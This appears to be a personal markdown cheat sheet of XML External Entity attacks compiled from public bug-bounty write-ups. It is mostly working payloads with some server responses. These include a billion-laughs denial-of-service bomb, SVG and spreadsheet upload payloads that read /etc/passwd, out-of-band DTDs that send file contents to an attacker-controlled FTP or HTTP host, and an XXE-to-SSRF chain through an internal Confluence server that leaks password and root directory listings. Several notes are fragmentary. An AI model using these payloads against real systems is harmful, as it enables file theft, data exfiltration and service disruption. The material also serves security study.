# XXE


[Link](https://medium.com/@protector47/5-005-worth-vulnerability-duplicated-how-i-loose-5-005-in-a-day-831f5a064713)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Dos Billion Laugh Attack 

-----

##External XML Entity via File Upload (SVG)

[link](https://0xatul.me/posts/2020/02/external-xml-entity-via-file-upload-svg/)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

he tried no response 

```xml
<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
```
```
<img src="/redacted/moreRedacted/avatarUser.svg" class="avatar">
```

opened link and successful /etc/passwd reflected 

----

Html, XML to pdf converter lead to xxe 
[link](https://www.corben.io/XSS-to-XXE-in-Prince/)


----
----


## Simple XXE 

[link](https://medium.com/@zain.sabahat/an-interesting-xxe-in-sap-8b35fec6ef33)


https://store.sap.com redirected  to https://store.sap.com/sap/cpa/ui/resources/store/html/StoreFront.html

One of the POST request to “/sap/cpa/api/getSolutions"

<br>
![image](https://miro.medium.com/max/1400/1*hfoBaTN6bjEQ0p_yenXoJw.png)

<br>

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM “Zain Here”> ]>
<SolutionListRequest><Facets><FacetType><Code/><Value/></FacetType></Facets
<ListingType>2</ListingType><CountryCode>US</CountryCode><RetrieveAllDetailsIndicator>1</RetrieveAllDetailsIndicator><RetrieveFacetsIndicator/>
<RowCount>24&xxe;</RowCount><RowIndex>1</RowIndex><SearchText/><SolutionGroup/>
<SolutionTypeIndicator/><CategoryID/><RecommenderPageIndicator/><ResellerID/>
<ShoppingCartID/><CompanyID/><EndCustomerAddressID/><UserRoleCode/>
</SolutionListRequest>
```

he passed this  He get error but also get name reflected 
after that he used for reading /etc/passwd 

----

## Out of Band XXE 

[link](https://medium.com/@mrnikhilsri/soap-based-unauthenticated-out-of-band-xml-external-entity-oob-xxe-in-a-help-desk-software-c27a6abf182a)

while registering he got this file

> https://victim.com/services/ApiService?wsdl

simple /etc/passwd was showing the error 

I setup an xxe.dtd file on my server with following payload:

```xml
<!ENTITY % d SYSTEM “file:///etc/passwd”>
<!ENTITY % c “<!ENTITY rrr SYSTEM ‘ftp://x.x.x.x:2121/%d;'>">
```

> https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb

for making ftp server 

```xml
<!DOCTYPE a [ <!ENTITY % asd SYSTEM "http://x.x.x.x/xxe.dtd"> %asd; %c;]>
<sessionId>&rrr;</sessionId>
```

![i](https://miro.medium.com/max/1400/1*BlEduM6y9k8g_Uip1TCBHQ.jpeg)

you will start receiving content of /etc/passwd file on emulated FTP server as shown in  writeup

----


## Good SSRF to XXE read it 

[Link](https://medium.com/bugbountywriteup/bug-bounty-fastmail-feeda67905f5)

----

## 0Day in Uber  (code42) 

[link](https://httpsonly.blogspot.com/2017/01/0day-writeup-xxe-in-ubercom.html)

He Found https://backup.uberinternal.com:4285/api/serverEnv

which require can this is login system by code42.com 

so he found that /api/SsoAuthLoginResponse this is endpoint in that and in documentation it is stated that it will accept GET parameter SAMLResponse which will be **base64 encoded** 

XXE OOB exploitation in java coded [java](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)

----

## -> Exploiting Out Of Band XXE using internal network and [php wrappers](https://mahmoudsec.blogspot.com/2019/08/exploiting-out-of-band-xxe-using.html)

He found out that there is xml parameter which sending the encrypted data we dont what encryption js reading doesnt helped him. He use break-point found something. wjhich allow him modify the XML data before it's sent to the encryption function.
<br>
![im](https://1.bp.blogspot.com/-89TuBe9EE04/XUoNr6ExKYI/AAAAAAAAFAo/v0JSV4_gcTUYVXy1Pl618p58Tx7MUQ1OwCLcBGAs/s1600/Screen%2BShot%2B2019-08-07%2Bat%2B1.28.52%2BAM.jpg)
<br>

normal XXE payloads to see if the parser will try to fetch anything from my server this take long time returned error in parsing
`http://localhost/` the server responded quickly without returning anything. With that said, He realized that there must be a firewall blocking requests to external server.

<br>
So he can see open port but nothing to increase the impact 

use cookie authentication and used SID parameter 

He found one endpoint which take three param sid key and val 

```
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://target/endpoint.php?sid=[session_id]&key=xxe&val=test">
]>
<paramlimits>
  <component name="L1" min="2" max="100">&xxe;</component>
</paramlimits>
```

```php
php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgJSBkYXRhIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1maWxlOi8vL0Q6L3BhdGgvaW5kZXgucGhwIj4NCjwhRU5USVRZICUgcGFyYW0xICc8IUVOVElUWSBleGZpbCBTWVNURU0gImh0dHA6Ly90YXJnZXQvZW5kcG9pbnQucGhwP3NpZD1bc2Vzc2lvbl9pZF0mIzM4O2tleT14eGUmIzM4O3ZhbD0lZGF0YTsiPic+
```

<br>

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///D:/path/index.php">
<!ENTITY % param1 '<!ENTITY exfil SYSTEM "http://target/endpoint.php?sid=[session_id]&#38;key=xxe&#38;val=%data;">'>
```

not able to understand full read it when you have time 

-----

# -> XXE next level (big writeup) [link](https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/)

```
GET /interesting/ HTTP/1.1
Host: server.company.com
```

```
HTTP/1.1 404 Not Found
Server: nginx
Date: Tue, 04 Dec 2018 10:08:18 GMT
Content-Type: text/xml
Content-Length: 189
Connection: keep-alive

<result>
<errors>
<error>The request is invalid: The requested resource could not be found.</error>
</errors>
</result>
```

It Look like simple error page change GET to POST content-type to xml

```
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

<?xml version="abc" ?>
<Doc/>
```

```http
<result>
<errors>
<error>The request is invalid: The request content was malformed:
XML version "abc" is not supported, only XML 1.0 is supported.</error>
</errors>
</result>
```

Some Error Can be Easily Fixed 

```http
POST /interesting/ HTTP/1.1
Host: server.company.com
Content-Type: application/xml
Content-Length: 30

<?xml version="1.0" ?>
<Doc/>
```

```xml
<result>
<errors>
<error>Authentication failed: The resource requires authentication, which was not supplied with the request</error>
</errors>
</result>
```

Accepting Xml . But Problem is not documentation we don't what is correct way though 
In any case, this is the point where you should try and include a DOCTYPE definition to see whether the use of external entities is blocked off completely, or whether you can continue your quest for fun and profit.

```http
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://59c99fu65h6mqfmhf5agv1aptgz6nv.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```
The server was not able to produce a timely response to your request.
```

collab has DNS only .

server appears to resolve my domain name, but the expected HTTP request is not there. Furthermore, note that the server timed out after a few seconds with a 500 error.

This means firewall is work 

```http
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "file:///etc/passwd"> %ext;
]>
<r></r>
```

```
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

This indicates that the file exists and could be opened and read by the XML parser, but the contents of the file are not a valid Document Type Definition (DTD), so the parser fails and throws an error.


```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "file:///etc/passwdxxx"> %ext;
]>
<r></r>
```

```
The request is invalid: The request content was malformed:
/etc/passwdxxx (No such file or directory)
```

Lets Try Blind XXE thing

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://localhost:22/"> %ext;
]>
<r></r>
```

```
The request is invalid: The request content was malformed:
Invalid Http response
```

Not Critical but can be reported 

```
<?xml version="1.0" ?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "gopher://localhost/"> %ext; ]>
<r></r>
```

```
The request is invalid: The request content was malformed:
unknown protocol: gopher
```

 found a number of internal resources that looked promising, e.g.:

wiki.company.internal
jira.company.internal
confluence.company.internal

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://wiki.company.internal/"> %ext;
]>
<r></r>
```

```xml
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

This means internal network traffic is allowed, and our internal request succeeded!
As He know Jira can be used for SSRF 

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "https://jira.company.internal/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```
The request is invalid: The request content was malformed:
sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
```


HTTPS traffic fails if anything in the SSL verification goes wrong. Luckily, Jira by default also runs as a plain HTTP service on TCP port 8080. 

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```
The request is invalid: The request content was malformed:
http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri
```

The Jira instance is probably patched or has the vulnerable plug-in disabled. (Collab was not getting anythnig) . 

After frantically and fruitlessly looking for known SSRF vulnerabilities on different types of Wiki applications (and against better judgment), I decided to try the same Jira vulnerability against the internal Confluence instance instead (running on port 8090 by default):

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://4hm888a6pb127f2kwu2gsek23t9jx8.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

```
The request is invalid: The request content was malformed:
The markup declarations contained or pointed to by the document type declaration must be well-formed.
```

Finall Http request in our collab .


Now we can host evil.xml in attacker server

```
<!ENTITY % file SYSTEM "file:///">
<!ENTITY % ent "<!ENTITY data SYSTEM '%file;'>">
```

- Load the contents of the external reference (in this case the system’s / directory) into the variable %file;.
- Define a variable %ent; that really just glues pieces together to compile a third entity definition, to…
- try and access the resource at location %file; (wherever that may point) and load whatever is in that location into the entity data;.

Note that we intend the third definition to fail, since the contents of %file; will not point to a valid resource location, but instead contains the contents of a complete directory.

Now, use the Confluence “proxy” to point to our evil file, and ensure that the %ent; and &data; parameters are accessed to trigger the directory access:

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml">
%ext;
%ent;
]>
<r>&data;</r>
```

this shows another way to get error-based output back from the server, i.e. by specifying a “missing” protocol,

e.g. reading /etc/passwd with the aforementioned method results in the following error:

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml">
%ext;
%ent;
]>
<r>&data;</r>
```

> unknown protocol: root


the file can be read up until the first occurrence of a colon :, but no further. A way to bypass this and force the complete file content to be displayed in the error message, is by prepending a colon before the file contents. 

This will force the “no protocol” error, since the field before the first colon will be empty

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

Note the added colon before %file;

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml">
%ext;
%ent;
]>
<r>&data;</r>
```

```
no protocol: :root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
[…]
```

 since Java returns directory listing when accessing a directory rather than a file, it is possible to do a non-intrusive check for root privileges by trying to list files in the /root directory:

```
<!ENTITY % file SYSTEM "file:///root">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

response was 

```
no protocol: :.bash_history
.bash_logout
.bash_profile
.bashrc
.pki
.ssh
[...]
```

----

##XXE at [Bol.com](https://medium.com/@jonathanbouman/xxe-at-bol-com-7d331186de54)

<br>

This part of the website allows one to upload products ready to (re)sell.

Aanbod beheren via excel’ means ‘Manage inventory in Excel’.

You can Download file , Upload and can see change made. 

Let’s unzip the XLSX.

If we open the sheet1.xml we will see the following code.(in poc)

Let’s say we want to try to inject the file contents of /etc/passwd into the Offer description (this is cell G4, see the original Excel sheet).

As we can see in the image the string ‘Sample description’ is being referred to by the id 108. Let’s add our custom entity to this sheet and replace this cells value with our custom entity.

We save the file, zip the folder again and rename the file to xlsx.
If the XXE attack works it would update our Sample Product (row 4 in Excel) and inject the file contents of /etc/passwd

![ko](https://miro.medium.com/max/2000/1*9ro87L9jNBcVoW2pgssylA.gif)

Bonus #1: Directory listing
The XML parser used by Bol.com returns file names (as one big string) if we try to parse directories instead of files (i.e.<!ENTITY body SYSTEM "file:///etc/">). This allows us to quickly enumerate all the files on the server, no brute force of file names is needed.

Bonus #2: Image upload? Check for XXE!
It is possible to inject XXE payloads in plenty of files. So every image upload is a potential XXE vulnerability. BuffaloWill created an [awesome tool](https://github.com/BuffaloWill/oxml_xxe) that allows you to easily embed a XXE payloads into all those different files. 
Don’t forget to checkout his [talk](https://www.youtube.com/watch?v=LZUlw8hHp44) at Defcon 2015.








----


# Extra 

Some DTD stuff here and there [Go here](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

